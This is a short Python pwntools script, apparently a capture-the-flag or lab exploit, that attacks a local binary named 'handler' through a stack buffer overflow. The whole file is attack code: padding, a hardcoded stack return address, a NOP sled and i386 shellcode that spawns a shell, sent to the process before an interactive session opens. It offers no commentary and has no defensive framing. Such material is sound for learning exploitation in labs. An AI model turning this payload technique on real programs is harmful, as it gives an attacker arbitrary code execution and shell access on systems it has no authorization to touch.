#!/bin/python
from pwn import *

context.binary = ELF("/tmp/xdead-utm2/handler")

p = process()

sc = shellcraft.i386.linux.sh()
sc += shellcraft.i386.linux.exit(0)

avoid = {'\x00'}

payload = 'A' * 16
payload += p32(0xffffdd8c + 30)
payload += '\x90' * 60
payload += asm(sc)
payload += 'A' * 16

log.info(p.clean())

pause()
p.sendline(str(len(payload)))
p.sendline(payload)

p.interactive()
#log.info(p.clean())
